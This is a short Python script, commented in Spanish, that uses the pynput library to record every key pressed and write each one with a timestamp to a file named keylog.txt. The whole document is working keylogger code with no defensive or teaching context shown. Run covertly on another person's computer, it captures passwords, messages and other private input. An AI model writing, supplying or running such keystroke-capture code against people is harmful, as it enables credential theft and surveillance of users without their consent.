import pynput
from pynput.keyboard import Key, Listener
import logging

# Configurar el archivo donde se guardarán las pulsaciones
direccion_log = "keylog.txt"
logging.basicConfig(filename=direccion_log, level=logging.DEBUG, format='%(asctime)s: %(message)s')

# Funciones para registrar las teclas presionadas
def on_press(key):
    logging.info(str(key))

# Iniciar el listener
with Listener(on_press=on_press) as listener:
    listener.join()